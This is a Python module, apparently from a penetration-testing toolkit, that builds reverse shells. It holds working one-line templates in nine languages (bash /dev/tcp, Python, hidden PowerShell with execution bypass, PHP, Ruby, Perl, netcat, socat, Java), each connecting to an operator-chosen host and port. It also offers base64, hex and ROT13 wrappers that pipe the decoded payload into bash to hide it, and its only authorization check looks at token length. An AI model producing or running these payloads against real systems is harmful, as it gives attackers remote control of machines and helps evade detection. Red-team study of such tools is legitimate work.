"""Reverse Shell 生成器 - Real Implementation"""

import hashlib
import logging
from datetime import datetime

from ..models import (
    PayloadConfig,
    PayloadResult,
    PayloadType,
    ReverseShellLanguage,
    PayloadFormat,
)

logger = logging.getLogger(__name__)


class ReverseShellGenerator:
    """Reverse Shell 生成器 - 真實實現"""

    # Reverse Shell Templates
    SHELLS = {
        ReverseShellLanguage.BASH: 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        ReverseShellLanguage.PYTHON: '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' ''',
        ReverseShellLanguage.POWERSHELL: '''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()''',
        ReverseShellLanguage.PHP: '''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
        ReverseShellLanguage.RUBY: '''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
        ReverseShellLanguage.PERL: '''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
        ReverseShellLanguage.NETCAT: 'nc -e /bin/sh {lhost} {lport}',
        ReverseShellLanguage.SOCAT: '''socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}''',
        ReverseShellLanguage.JAVA: '''
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()
''',
    }

    async def generate(self, config: PayloadConfig) -> PayloadResult:
        """
        生成 Reverse Shell
        
        Args:
            config: Payload 配置
            
        Returns:
            PayloadResult: 生成結果
        """
        start_time = datetime.now()
        
        # 授權檢查
        if not config.authorization_token or len(config.authorization_token) < 32:
            logger.error("Unauthorized reverse shell generation attempt")
            return PayloadResult(
                success=False,
                payload=None,
                payload_type=PayloadType.REVERSE_SHELL,
                platform=config.platform,
                format=config.format,
                authorized=False,
                error_message="Authorization required for reverse shell generation"
            )
        
        try:
            # 選擇 shell 語言
            language = config.shell_language or ReverseShellLanguage.BASH
            
            if language not in self.SHELLS:
                return PayloadResult(
                    success=False,
                    payload=None,
                    payload_type=PayloadType.REVERSE_SHELL,
                    platform=config.platform,
                    format=config.format,
                    authorized=True,
                    error_message=f"Unsupported shell language: {language}"
                )
            
            # 生成 reverse shell
            shell_template = self.SHELLS[language]
            shell_code = shell_template.format(
                lhost=config.lhost,
                lport=config.lport
            )
            
            # 混淆處理
            if config.obfuscation.value != "none":
                shell_code = self._obfuscate(shell_code, config.obfuscation.value)
            
            # 計算 hash
            payload_bytes = shell_code.encode('utf-8')
            md5_hash = hashlib.md5(payload_bytes).hexdigest()
            sha256_hash = hashlib.sha256(payload_bytes).hexdigest()
            
            execution_time = (datetime.now() - start_time).total_seconds()
            
            logger.info(f"✅ Reverse shell generated: {language.value}, {len(payload_bytes)} bytes")
            
            return PayloadResult(
                success=True,
                payload=shell_code,
                payload_type=PayloadType.REVERSE_SHELL,
                platform=config.platform,
                format=config.format,
                size_bytes=len(payload_bytes),
                md5_hash=md5_hash,
                sha256_hash=sha256_hash,
                execution_time=execution_time,
                is_obfuscated=config.obfuscation.value != "none",
                obfuscation_methods=[config.obfuscation.value] if config.obfuscation.value != "none" else [],
                authorized=True,
                authorization_level=config.risk_level
            )
            
        except Exception as e:
            logger.exception(f"Reverse shell generation error: {e}")
            return PayloadResult(
                success=False,
                payload=None,
                payload_type=PayloadType.REVERSE_SHELL,
                platform=config.platform,
                format=config.format,
                authorized=True,
                error_message=f"Exception: {str(e)}"
            )
    
    def _obfuscate(self, payload: str, method: str) -> str:
        """
        混淆 payload
        
        Args:
            payload: 原始 payload
            method: 混淆方法
            
        Returns:
            str: 混淆後的 payload
        """
        import base64
        
        if method == "base64":
            # Base64 編碼
            encoded = base64.b64encode(payload.encode()).decode()
            return f"echo {encoded} | base64 -d | bash"
        
        elif method == "hex":
            # Hex 編碼
            hex_encoded = payload.encode().hex()
            return f"echo {hex_encoded} | xxd -r -p | bash"
        
        elif method == "rot13":
            # ROT13
            import codecs
            rot13 = codecs.encode(payload, 'rot_13')
            return f"echo '{rot13}' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash"
        
        else:
            return payload
